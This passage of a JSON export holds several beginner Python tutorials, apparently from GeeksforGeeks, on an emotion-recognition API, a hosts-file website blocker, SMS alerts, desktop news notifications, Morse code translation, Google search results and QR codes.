subscription_key,}\u00a0\u00a0params = urllib.parse.urlencode({})\u00a0\u00a0# Replace the URL# below with the# URL of the image# you want to analyze.url1 = 'IMAGE URL TO BE ADDED HERE'body = { 'url': url1 }newbody =str(body)\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0# NOTE: You must use the same region in your REST call as you used to obtain your subscription keys.\u00a0\u00a0\u00a0\u00a0# For example, if you obtained your subscription keys from westcentralus, replace \"westus\" in the\u00a0\u00a0\u00a0\u00a0# URL below with \"westcentralus\".\u00a0\u00a0\u00a0\u00a0conn = http.client.HTTPSConnection('westus.api.cognitive.microsoft.com')\u00a0\u00a0\u00a0\u00a0conn.request(\"POST\", \"/emotion/v1.0/recognize?%s\" % params, newbody, headers)\u00a0\u00a0\u00a0\u00a0response = conn.getresponse()\u00a0\u00a0\u00a0\u00a0data = response.read()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0parsed = json.loads(data)\u00a0\u00a0\u00a0\u00a0print (\"Response:\")\u00a0\u00a0\u00a0\u00a0print (json.dumps(parsed, sort_keys=True, indent=2))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# the emotion of image\u00a0\u00a0\u00a0\u00a0# will the max value of\u00a0\u00a0\u00a0\u00a0# any emotion obtained\u00a0\u00a0\u00a0\u00a0# from the different\u00a0\u00a0\u00a0\u00a0# scores of each emotion\u00a0\u00a0\u00a0\u00a0val = parsed[0][\"scores\"]\u00a0\u00a0\u00a0\u00a0res = max(val, key = val.get)\u00a0\u00a0\u00a0\u00a0print (\"\\nEmotion :: \",res)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0conn.close()except Exception as e:\u00a0\u00a0\u00a0\u00a0print(e.args)The sample project using this api is available on SnapLookMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "53c756022b15727f75952017b87db52e",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "This is real world program which blocks certain distracting website like Facebook, Youtube etc during your work hours.About the program : What we are going to in this program is that we will pass the link of websites which you think is distracting and the time that you are working on your computer and program will block those website.Program Architecture:Every system have host file whether it is Mac, Windows or Linux.Host file in Mac and Linux :/etc/hostsHost file in Windows:C:\\Windows\\System32\\drivers\\etcWorking of host file: Host is an operating system file which maps hostnames to IP addresses. In this program we will be mapping hostnames of websites to our localhost address. Using python file handling manipulation we will write the hostname in hosts.txt and remove the lines after your working hours.Host file in Mac:# Run this script as root\u00a0\u00a0import timefrom datetime import datetime as dt\u00a0\u00a0# change hosts path according to your OShosts_path = \"/etc/hosts\"# localhost's IPredirect = \"127.0.0.1\"\u00a0\u00a0# websites That you want to blockwebsite_list =\u00a0[\"www.facebook.com\",\"facebook.com\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"dub119.mail.live.com\",\"www.dub119.mail.live.com\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"www.gmail.com\",\"gmail.com\"]\u00a0\u00a0while True:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# time of your work\u00a0\u00a0\u00a0\u00a0if dt(dt.now().year, dt.now().month, dt.now().day,8)\u00a0\u00a0\u00a0\u00a0\u00a0< dt.now() < dt(dt.now().year, dt.now().month, dt.now().day,16):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Working hours...\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0with open(hosts_path, 'r+') as file:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0content = file.read()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for website in website_list:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if website in content:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0pass\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# mapping hostnames to your localhost IP address\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.write(redirect + \" \" + website + \"\\n\")\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0with open(hosts_path, 'r+') as file:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0content=file.readlines()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.seek(0)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for line in content:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if not any(website in line for website in website_list):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.write(line)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# removing hostnmes from host file\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0file.truncate()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Fun hours...\")\u00a0\u00a0\u00a0\u00a0time.sleep(5)Special note for Windows users : Windows user need to create a duplicate of OS\u2019s host file. Now provide the path of the duplicate file in hosts_path mentioned in the script.Scheduling above script in Mac : For scheduling above script in Mac you have to open crontab in your terminal as a root.Write following command in terminal:sudo crontab -eYour terminal should look like this:Now press \u201ci\u201d to go into insert/editing mode and write @reboot python_script_path .Save the tab by pressing first esc to quit write mode and fall back to command mode and now write \u201c:wq\u201d and finally press enter to validate.Restart your system and see the magic.Scheduling in Windows: Scheduling of above script is little bit trick but I will guide you step by step-First of all change the extension of your script from \u201c.py\u201d to \u201c.pyw\u201d.Now open task scheduler. Task scheduler should look like this:You may see website blocker already scheduled because I have already scheduled in my computer for my testing purpose. Follow further instruction of scheduling carefully in order to schedule website blocker in your computer.Click on \u201ccreate task\u201d. Fill the name of your choice and flag \u201cRun with highest privilege\u201d.Now go to triggers, select \u201cAt startup\u201d for begin the task.Go to Action bar and create a new action and give path of your script.Go to conditions bar and unflag the power section.Press ok and you can see the script scheduled.Finally restart your computer and see the magic.Note: You can also check instantly by clicking run button.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "515a5ed03a7bdad6eed975111c696054",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "If you are running any python script and want to send regular updates from your script to your mobile phone through SMS, you can use SinchSMS API to send SMS.Approach :\u00a0Create an app on Sinch and get the key and secret of the app and use these credentials in the following script to send SMS to your mobile.Limitation of Sinch :\u00a0If you don\u2019t have any credits(you have to pay for credits), you can only send SMS to the registered mobile numbers on Sinch.\u00a0You can use way2sms to send SMS to any number(I will be discussing how to use way2sms in another article), but without purchased credits, on way2sms also, you can\u2019t send more than 100 SMS per day.\u00a0Python# python script for sending message update\u00a0import timefrom time import sleepfrom sinchsms import SinchSMS\u00a0# function for sending SMSdef sendSMS():\u00a0\u00a0\u00a0\u00a0\u00a0# enter all the details\u00a0\u00a0\u00a0\u00a0# get app_key and app_secret by registering\u00a0\u00a0\u00a0\u00a0# a app on sinchSMS\u00a0\u00a0\u00a0\u00a0number = 'your_mobile_number'\u00a0\u00a0\u00a0\u00a0app_key = 'your_app_key'\u00a0\u00a0\u00a0\u00a0app_secret = 'your_app_secret'\u00a0\u00a0\u00a0\u00a0\u00a0# enter the message to be sent\u00a0\u00a0\u00a0\u00a0message = 'Hello Message!!!'\u00a0\u00a0\u00a0\u00a0\u00a0client = SinchSMS(app_key, app_secret)\u00a0\u00a0\u00a0\u00a0print(\"Sending '%s' to %s\" % (message, number))\u00a0\u00a0\u00a0\u00a0\u00a0response = client.send_message(number, message)\u00a0\u00a0\u00a0\u00a0message_id = response['messageId']\u00a0\u00a0\u00a0\u00a0response = client.check_status(message_id)\u00a0\u00a0\u00a0\u00a0\u00a0# keep trying unless the status returned is Successful\u00a0\u00a0\u00a0\u00a0while response['status'] != 'Successful':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(response['status'])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0time.sleep(1)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0response = client.check_status(message_id)\u00a0\u00a0\u00a0\u00a0\u00a0print(response['status'])\u00a0if __name__ == \"__main__\":\u00a0\u00a0\u00a0\u00a0sendSMS()For the execution of the script, edit the number, app_key, and app_secret fields, and then simply run the script.I have written a complete script for sending SMS updates to mobile phones using sinchSMS and way2sms by fetching the latest updates from our placement website(aitplacements.com). GitHub link: stayUpdatedExercise: Create a python script that updates you on your mobile phone if the price of a particular product lowers down to a certain price on amazon.com\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "a8cdb5385fa67913e2be78123329ee25",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "To get started with the Desktop News Notifier, we require two libraries: feedparser and notify2.\u00a0Give following command to to install feedparser:\u00a0sudo pip3 install feedparserFor installing notify2 in your terminal:sudo pip3 install notify2Feedparser will parse the feed that we will get from the URL. We will use notify2 for the desktop notification purpose. Other than these two libraries, we will use OS and time lib. Once you are done with the installation import both libraries in the program. Here, in this example I have parsed the news from the BBC UK, you can use any news feedparser URL. Let\u2019s have a look at the program:\u00a0\u00a0Python# Python program to illustrate# desktop news notifierimport feedparserimport notify2import osimport timedef parseFeed():\u00a0\u00a0\u00a0\u00a0f = feedparser.parse(\"http://feeds.bbci.co.uk/news/rss.xml\")\u00a0\u00a0\u00a0\u00a0ICON_PATH = os.getcwd() + \"/icon.ico\"\u00a0\u00a0\u00a0\u00a0notify2.init('News Notify')\u00a0\u00a0\u00a0\u00a0for newsitem in f['items']:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0n = notify2.Notification(newsitem['title'],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0newsitem['summary'],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0icon=ICON_PATH\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0)\u00a0\u00a0\u00a0\u00a0n.set_urgency(notify2.URGENCY_NORMAL)\u00a0\u00a0\u00a0\u00a0n.show()\u00a0\u00a0\u00a0\u00a0n.set_timeout(15000)\u00a0\u00a0\u00a0\u00a0time.sleep(1200)\u00a0\u00a0\u00a0\u00a0\u00a0if __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0parseFeed()Screenshot of the news notification popupStep by step Explanation of Code:\u00a0f = feedparser.parse(\"http://feeds.bbci.co.uk/news/rss.xml\")Here feedparser will parse the news data from the feed URL. The parsed data will be in the form of dictionary.\u00a0ICON_PATH = os.getcwd() + \"/icon.ico\"If you want to set any icon in the notification then here we are setting the Icon path. This is optional.notify2.init('News Notify')Here we are initializing the notify2 using the init method of notify2. Initialize the D-Bus connection. Must be called before you send any notifications, or retrieve server info or capabilities. for newsitem in f['items']: \n        n = notify2.Notification(newsitem['title'], \n                                 newsitem['summary'], \n                                 icon=ICON_PATH \n                                 )Looping from the parsed data to get the relevant information like news title, short summary and setting the notification icon using the Notification method of the notify2 lib.n.set_urgency(notify2.URGENCY_NORMAL)Set the urgency level to one of URGENCY_LOW, URGENCY_NORMAL or URGENCY_CRITICALn.show()This method will show the notification on the Desktopn.set_timeout(15000)Setting the time to keep the notification on the desktop (in milliseconds). I have set here as 15 seconds.\u00a0time.sleep(1200)This will usually display the news notification every 20 mins. You can set the time as per your requirement. You can find the full source code that is hosted on GitHubThis article is contributed by Srce Cde. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "1c4832f0b2fae743e584b73d26d82c9c",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Morse code is a method of transmitting text information as a series of on-off tones, lights, or clicks that can be directly understood by a skilled listener or observer without special equipment. It is named for Samuel F. B. Morse, an inventor of the telegraph.AlgorithmThe algorithm is very simple. Every character in the English language is substituted by a series of \u2018dots\u2019 and \u2018dashes\u2019 or sometimes just singular \u2018dot\u2019 or \u2018dash\u2019 and vice versa.\u00a0Please refer to this Wikipedia image for details.Encryption\u00a0In the case of encryption, we extract each character (if not space) from a word one at a time and match it with its corresponding morse code stored in whichever data structure we have chosen(if you are coding in python, dictionaries can turn out to be very useful in this case)Store the morse code in a variable that will contain our encoded string and then we add a space to our string that will contain the result.While encoding in morse code we need to add 1 space between every character and 2 consecutive spaces between every word.If the character is a space then add another space to the variable containing the result. We repeat this process till we traverse the whole stringDecryptionIn the case of decryption, we start by adding a space at the end of the string to be decoded (this will be explained later).Now we keep extracting characters from the string till we are not getting any space.As soon as we get a space we look up the corresponding English language character to the extracted sequence of characters (or our morse code) and add it to a variable that will store the result.Remember keeping track of the space is the most important part of this decryption process. As soon as we get 2 consecutive spaces we will add another space to our variable containing the decoded string.The last space at the end of the string will help us identify the last sequence of morse code characters (since space acts as a check for extracting characters and start decoding them).Implementation:Python provides a data structure called a dictionary which stores information in the form of key-value pairs which is very convenient for implementing a cipher such as a morse code. We can save the morse code chart in a dictionary where (key-value pairs) => (English Characters-Morse Code). The plaintext (English characters) takes the place of keys and the ciphertext (Morse code) forms the values of the corresponding keys. The values of keys can be accessed from the dictionary in the same way we access the values of an array through their index and vice versa.\u00a0Python3# Python program to implement Morse Code Translator\u00a0'''VARIABLE KEY'cipher' -> 'stores the morse translated form of the english string''decipher' -> 'stores the english translated form of the morse string''citext' -> 'stores morse code of a single character''i' -> 'keeps count of the spaces between morse characters''message' -> 'stores the string to be encoded or decoded''''\u00a0# Dictionary representing the morse code chartMORSE_CODE_DICT = { 'A':'.-', 'B':'-...',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'C':'-.-.', 'D':'-..', 'E':'.',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'F':'..-.', 'G':'--.', 'H':'....',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'I':'..', 'J':'.---', 'K':'-.-',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'L':'.-..', 'M':'--', 'N':'-.',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'O':'---', 'P':'.--.', 'Q':'--.-',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'R':'.-.', 'S':'...', 'T':'-',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'U':'..-', 'V':'...-', 'W':'.--',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'X':'-..-', 'Y':'-.--', 'Z':'--..',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'1':'.----', '2':'..---', '3':'...--',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'4':'....-', '5':'.....', '6':'-....',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'7':'--...', '8':'---..', '9':'----.',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'0':'-----', ', ':'--..--', '.':'.-.-.-',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'?':'..--..', '/':'-..-.', '-':'-....-',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'(':'-.--.', ')':'-.--.-'}\u00a0# Function to encrypt the string# according to the morse code chartdef encrypt(message):\u00a0\u00a0\u00a0\u00a0cipher = ''\u00a0\u00a0\u00a0\u00a0for letter in message:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if letter != ' ':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Looks up the dictionary and adds the\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# correspponding morse code\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# along with a space to separate\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# morse codes for different characters\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cipher += MORSE_CODE_DICT[letter] + ' '\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# 1 space indicates different characters\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# and 2 indicates different words\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cipher += ' '\u00a0\u00a0\u00a0\u00a0\u00a0return cipher\u00a0# Function to decrypt the string# from morse to englishdef decrypt(message):\u00a0\u00a0\u00a0\u00a0\u00a0# extra space added at the end to access the\u00a0\u00a0\u00a0\u00a0# last morse code\u00a0\u00a0\u00a0\u00a0message += ' '\u00a0\u00a0\u00a0\u00a0\u00a0decipher = ''\u00a0\u00a0\u00a0\u00a0citext = ''\u00a0\u00a0\u00a0\u00a0for letter in message:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# checks for space\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (letter != ' '):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# counter to keep track of space\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0i = 0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# storing morse code of a single character\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0citext += letter\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# in case of space\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# if i = 1 that indicates a new character\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0i += 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# if i = 2 that indicates a new word\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if i == 2 :\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# adding space to separate words\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0decipher += ' '\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# accessing the keys using their values (reverse of encryption)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0decipher += list(MORSE_CODE_DICT.keys())[list(MORSE_CODE_DICT\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0.values()).index(citext)]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0citext = ''\u00a0\u00a0\u00a0\u00a0\u00a0return decipher\u00a0# Hard-coded driver function to run the programdef main():\u00a0\u00a0\u00a0\u00a0message = \"GEEKS-FOR-GEEKS\"\u00a0\u00a0\u00a0\u00a0result = encrypt(message.upper())\u00a0\u00a0\u00a0\u00a0print (result)\u00a0\u00a0\u00a0\u00a0\u00a0message = \"--. . . -.- ... -....- ..-. --- .-. -....- --. . . -.- ... \"\u00a0\u00a0\u00a0\u00a0result = decrypt(message)\u00a0\u00a0\u00a0\u00a0print (result)\u00a0# Executes the main functionif __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0main()Output:--. . . -.- ... -....- ..-. --- .-. -....- --. . . -.- ... \nGEEKS-FOR-GEEKSThis article is contributed by Palash Nigam . If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "f5ddafb4ff811b791ecdfd25cdc08cc5",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Let\u2019s say you are working on a project that needs to do web scraping but you don\u2019t know websites on which scraping is to be performed beforehand instead you are required to perform a google search and then proceed according to google search results to a few websites. In that case, you need google search results for your different queries.One way of achieving this is using request and beautiful soup which has been discussed here in Implementing Web Scraping in Python with BeautifulSoup.Instead of putting so much effort into a trivial task google package has been made. It\u2019s almost a one-liner solution to find links to all the google search results directly.Using python package google we can get results of google search from the python script. We can get links to first n search results.Installation\u00a0google package has one dependency on beautifulsoup which needs to be installed first.\u00a0\u00a0pip install beautifulsoup4Then install the google package\u00a0\u00a0pip install googleRequired Function and its parameters\u00a0query: query string that we want to search for.TLD: TLD stands for the top-level domain which means we want to search our results on google.com or google. in or some other domain.lang: lang stands for language.num: Number of results we want.start: The first result to retrieve.stop: The last result to retrieve. Use None to keep searching forever.pause: Lapse to wait between HTTP requests. Lapse too short may cause Google to block your IP. Keeping significant lapses will make your program slow but it\u2019s a safe and better option.Return: Generator (iterator) that yields found URLs. If the stop parameter is None the iterator will loop forever.Python codes on how to do a google search using python scriptExample1: google_search.py\u00a0\u00a0Pythontry:\u00a0\u00a0\u00a0\u00a0from googlesearch import searchexcept ImportError:\u00a0\u00a0\u00a0\u00a0print(\"No module named 'google' found\")\u00a0# to searchquery = \"Geeksforgeeks\"\u00a0for j in search(query, tld=\"co.in\", num=10, stop=10, pause=2):\u00a0\u00a0\u00a0\u00a0print(j)Output:\u00a0Let\u2019s perform a google search manually and verify our result\u00a0Example 2: google_search.py\u00a0Pythontry:\u00a0\u00a0\u00a0\u00a0from googlesearch import searchexcept ImportError:\u00a0\u00a0\u00a0\u00a0print(\"No module named 'google' found\")\u00a0# to searchquery = \"A computer science portal\"\u00a0for j in search(query, tld=\"co.in\", num=10, stop=10, pause=2):\u00a0\u00a0\u00a0\u00a0print(j)Output:\u00a0\u00a0Let\u2019s perform a google search manually and verify our resultReference: Google python packageThis article is contributed by Pratik Chhajer. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "c5e191854e164ebae73919b520e208df",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "This article aims to introduce the use of the python library: qrtools. This library can be used to both read QR codes and generate them.What are QR codes?QR code, or quick response code, is a trademark for a type of 2 dimensional barcode. 2 dimensional barcodes are similar to one dimensional barcodes, but can store more information per unit area.Installation and DependenciesDebian Linux: qrtools can be installed on debian based linux systems with the following commands\r\nsudo apt-get update\r\nsudo apt-get install python-qrtools\r\nThe following dependencies must be installed as well\r\n[sudo] pip install pypng\r\n[sudo] pip install zbar\r\n[sudo] pip install pillow\r\nWindows: qrtools can be installed on windows by downloading the file from here. On downloading and extraction, run the following command from inside the folder\r\npython setup.py install\r\nGenerate a QR Codeqrtools contains a class QR (can be viewed in the source code), for which we must initially create an object. The object takes the following argumentsdatapixel_sizelevelmargin_sizedata_typeTo create a QR code with default settings, we must simply specify the data while creating the object. Note that the data must be a unicode object if non-ASCII objects are going to be used.# Python program to generate QR codefrom qrtoolsimport QR\u00a0\u00a0# creates the QR objectmy_QR = QR(data = u\"Example\")\u00a0\u00a0# encodes to a QR codemy_QR.encode()If the program runs successfully, it returns a value of 0, and the QR code is stored in the tmp folder. To know the exact location, use the following 